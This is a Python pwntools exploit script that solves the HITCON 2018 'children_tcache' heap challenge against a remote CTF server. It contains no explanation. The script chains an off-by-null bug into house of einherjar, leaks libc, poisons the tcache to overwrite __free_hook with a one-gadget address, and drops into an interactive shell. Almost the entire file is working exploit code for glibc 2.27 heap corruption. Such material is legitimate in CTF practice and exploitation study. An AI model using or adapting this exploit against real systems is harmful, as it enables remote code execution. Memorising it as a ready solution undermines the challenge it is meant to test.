from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./HITCON_2018_children_tcache"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 29838)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con):
    sla("Your choice: ", "1")
    sla("Size:", str(size))
    sa("Data:", con)

def show(index):
    sla("Your choice: ", "2")
    sla("Index:", str(index))

def free(index):
    sla("Your choice: ", "3")
    sla("Index:", str(index))


# off by null (not read, it's strcpy in the add func)

# house of einherjar
add(0x420, "a")   # 0
add(0x18, "a")    # 1
add(0x4f0, "a")   # 2
add(0x10, "a")    # 3

free(0)
free(1)
for i in range(8):
    add(0x18-i, cyclic(0x18))  # 0
    free(0)
add(0x12, cyclic(0x10)+p16(0x20+0x430)) # 0
free(2)

# leak libc
add(0x420, "a")  # 1
show(0)
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["__malloc_hook"]-0x70
print("base: ", hex(base))
free_hook = base+libc.sym["__free_hook"]
oneshot = base+0x4f322

# overwrite free_hook to oneshot 
add(0x10, "a")   # 2
free(0)
free(2)
add(0x10, p64(free_hook))  # 0
add(0x10, "a")   # 2
add(0x10, p64(oneshot))     # 3

# attack
free(2)

shell()


